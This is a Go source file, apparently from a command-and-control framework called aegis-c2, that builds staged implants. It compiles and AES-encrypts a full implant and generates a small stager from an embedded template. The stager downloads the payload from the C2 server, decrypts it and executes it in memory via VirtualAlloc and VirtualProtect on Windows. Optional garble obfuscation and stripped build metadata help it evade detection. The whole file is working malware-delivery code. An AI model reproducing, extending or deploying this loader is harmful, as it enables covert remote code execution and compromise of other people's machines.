package builder

import (
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"text/template"

	servercrypto "github.com/aegis-c2/aegis/server/crypto"
)

// StagedResult 返回 staged delivery 的构建结果。
type StagedResult struct {
	StagerPath   string // 小体积 stager 二进制路径
	Stage2Path   string // 加密 stage2 路径（用于下载）
	Stage2ID     string // /stage/{ID} 端点使用的 payload ID
	Stage2KeyHex string // AES-GCM 密钥 hex（供 operator 记录）
	Stage2Size   int64
	StagerSize   int64
}

// BuildStaged 执行 staged (stager → stage2) 构建。
// 流程：
//  1. 编译完整 implant（stage2）
//  2. 用随机 AES-GCM 密钥加密 stage2
//  3. 注册到 stage store（由 /stage/{ID} 端点服务）
//  4. 编译小型 stager，嵌入 serverURL + stage2ID + AES key
func (b *Builder) BuildStaged(cfg *BuildConfig, stageStore map[string][]byte) (*StagedResult, error) {
	// 1. 生成 stage2 payload ID + AES key
	stage2ID := fmt.Sprintf("s2-%s", randomHex(16))
	aesKey := make([]byte, 16)
	rand.Read(aesKey)

	// 2. 编译 stage2（完整 implant）
	stage2Path, err := b.Build(cfg)
	if err != nil {
		return nil, fmt.Errorf("build stage2: %w", err)
	}

	// 3. 读取 stage2 并加密
	stage2Data, err := os.ReadFile(stage2Path)
	if err != nil {
		return nil, fmt.Errorf("read stage2: %w", err)
	}

	encrypted, _, err := servercrypto.EncryptAESGCM(aesKey, stage2Data)
	if err != nil {
		return nil, fmt.Errorf("encrypt stage2: %w", err)
	}

	// 4. 存储加密后的 stage2
	stageStore[stage2ID] = encrypted

	// 5. 编译 stager
	stagerPath, err := b.buildStagerBinary(cfg, stage2ID, aesKey)
	if err != nil {
		return nil, fmt.Errorf("build stager: %w", err)
	}

	stagerInfo, _ := os.Stat(stagerPath)
	stage2Info, _ := os.Stat(stage2Path)

	return &StagedResult{
		StagerPath:   stagerPath,
		Stage2Path:   stage2Path,
		Stage2ID:     stage2ID,
		Stage2KeyHex: hex.EncodeToString(aesKey),
		Stage2Size:   stage2Info.Size(),
		StagerSize:   stagerInfo.Size(),
	}, nil
}

// buildStagerBinary 编译 stager 可执行文件。
func (b *Builder) buildStagerBinary(cfg *BuildConfig, stage2ID string, aesKey []byte) (string, error) {
	buildDir, err := b.createBuildDir(cfg.Name + "-stager")
	if err != nil {
		return "", fmt.Errorf("create build dir: %w", err)
	}
	defer os.RemoveAll(buildDir)

	// 解析 server URL
	serverURL := cfg.ServerURL
	stageURL := fmt.Sprintf("%s/stage/%s", serverURL, stage2ID)

	// 渲染 stager 模板
	mainTpl, err := template.New("stager").Parse(stagerTemplate)
	if err != nil {
		return "", err
	}

	var buf strings.Builder
	err = mainTpl.Execute(&buf, struct {
		StageURL string
		AESKey   string
		GOOS     string
	}{
		StageURL: stageURL,
		AESKey:   hex.EncodeToString(aesKey),
		GOOS:     cfg.GOOS,
	})
	if err != nil {
		return "", err
	}

	mainPath := filepath.Join(buildDir, "cmd", "main.go")
	if err := os.WriteFile(mainPath, []byte(buf.String()), 0644); err != nil {
		return "", err
	}

	// 写入 go.mod
	gomod := `module stager

go 1.25
`
	if err := os.WriteFile(filepath.Join(buildDir, "go.mod"), []byte(gomod), 0644); err != nil {
		return "", err
	}

	// 编译
	var ext string
	if cfg.GOOS == "windows" {
		ext = ".exe"
	}
	outputFile := filepath.Join(b.outputDir, filepath.Clean(cfg.Name)+"-stager"+ext)

	var cmdName string
	var args []string

	if cfg.UseGarble {
		cmdName = "garble"
		args = []string{"build", "-seed=random", "-literals", "-tiny",
			"-ldflags", "-s -w -buildid=", "-trimpath", "-o", outputFile, "./cmd"}
	} else {
		cmdName = "go"
		args = []string{"build", "-ldflags", "-s -w -buildid=", "-trimpath", "-o", outputFile, "./cmd"}
	}

	cmd := exec.Command(cmdName, args...)
	cmd.Dir = buildDir

	samePlatform := cfg.GOOS == runtime.GOOS && cfg.GOARCH == runtime.GOARCH
	if !samePlatform {
		cmd.Env = append(os.Environ(),
			"GOOS="+cfg.GOOS,
			"GOARCH="+cfg.GOARCH,
			"CGO_ENABLED=0",
		)
	}

	if cfg.UseGarble {
		if cmd.Env == nil {
			cmd.Env = os.Environ()
		}
		cmd.Env = append(cmd.Env, "GOGARBLE=*")
		checkCmd := exec.Command("garble", "version")
		if err := checkCmd.Run(); err != nil {
			return "", fmt.Errorf("garble not found in PATH")
		}
	}

	output, err := cmd.CombinedOutput()
	if err != nil {
		return "", fmt.Errorf("%s build failed: %s\n%s", cmdName, err, string(output))
	}

	return outputFile, nil
}

func randomHex(n int) string {
	b := make([]byte, n)
	rand.Read(b)
	return hex.EncodeToString(b)
}

// stagerTemplate 是 stager 的源码模板。
// Stager 是一个小型可执行文件，仅负责：
//  1. 从服务器下载加密的 stage2
//  2. AES-GCM 解密
//  3. 分配 RWX 内存并执行
const stagerTemplate = `package main

import (
	"crypto/aes"
	"crypto/cipher"
	"encoding/hex"
	"io"
	"net/http"
	"runtime"
	"syscall"
	"unsafe"
)

const (
	stageURL = {{printf "%q" .StageURL}}
	aesKey   = {{printf "%q" .AESKey}}
)

func main() {
	// 1. 下载加密 stage2
	resp, err := http.Get(stageURL)
	if err != nil {
		return
	}
	defer resp.Body.Close()

	if resp.StatusCode != 200 {
		return
	}

	encrypted, err := io.ReadAll(resp.Body)
	if err != nil {
		return
	}

	// 2. AES-GCM 解密
	key, _ := hex.DecodeString(aesKey)
	block, err := aes.NewCipher(key)
	if err != nil {
		return
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return
	}
	nonceSize := gcm.NonceSize()
	if len(encrypted) < nonceSize {
		return
	}
	nonce, ciphertext := encrypted[:nonceSize], encrypted[nonceSize:]
	stage2, err := gcm.Open(nil, nonce, ciphertext, nil)
	if err != nil {
		return
	}

	// 3. 分配 RW 内存，写入 stage2，再改为 RX 执行
	runtime.KeepAlive(stage2)
	buf := allocRW(len(stage2))
	if buf == nil {
		return
	}
	copy(unsafe.Slice((*byte)(buf), len(stage2)), stage2)
	protectRX(buf, len(stage2))
	syscall.SyscallN(uintptr(buf), 0, 0, 0)
}

// allocRW 分配 PAGE_READWRITE 内存（可写，用于注入前填充）。
func allocRW(size int) uintptr {
	if runtime.GOOS == "windows" {
		kernel32 := syscall.NewLazyDLL("kernel32.dll")
		va := kernel32.NewProc("VirtualAlloc")
		// MEM_COMMIT | MEM_RESERVE = 0x3000, PAGE_READWRITE = 0x04
		addr, _, _ := syscall.SyscallN(va.Addr(), 0, uintptr(size), 0x3000, 0x04)
		return addr
	}
	return 0
}

// protectRX 将已有内存页改为 PAGE_EXECUTE_READ。
func protectRX(buf uintptr, size int) {
	if runtime.GOOS == "windows" {
		kernel32 := syscall.NewLazyDLL("kernel32.dll")
		vp := kernel32.NewProc("VirtualProtect")
		var oldProtect uintptr
		syscall.SyscallN(vp.Addr(), buf, uintptr(size), 0x20, uintptr(unsafe.Pointer(&oldProtect)))
	}
}
`
